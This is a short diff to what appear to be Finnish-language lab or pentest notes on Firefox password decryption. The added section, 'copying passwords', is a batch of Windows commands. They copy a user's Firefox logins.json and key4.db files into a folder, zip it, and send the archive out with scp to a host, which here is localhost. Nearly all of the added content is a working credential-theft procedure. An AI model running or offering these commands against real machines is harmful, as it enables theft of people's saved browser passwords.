@@ -13,3 +13,16 @@ Firefox password decryption:
 C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\l9ukvzcl.default\ķey4.db  
   
 Key.db numero vaihtelee
+  
+Salasanojen kopiointi:
+```
+mkdir C:\salasanat\
+powershell Copy-Item -Path C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
+powershell Copy-Item -Path C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
+pause
+powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
+pause
+scp C:\salasanat\salasanat.zip restricted@127.0.0.1:/home/restricted/.
+pause
+```
+
